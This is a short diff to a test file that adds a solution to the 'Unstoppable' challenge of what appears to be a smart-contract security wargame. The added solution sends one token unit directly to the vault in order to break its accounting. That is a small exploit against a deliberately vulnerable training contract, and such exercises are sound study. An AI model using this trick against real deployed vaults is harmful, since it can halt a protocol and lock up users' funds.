@@ -45,6 +45,8 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        // transfer 1 wei DVT tokens to the vault to modify the value "flashFee" function returns
+        await token.transfer(vault.address, 1)
     });
 
     after(async function () {
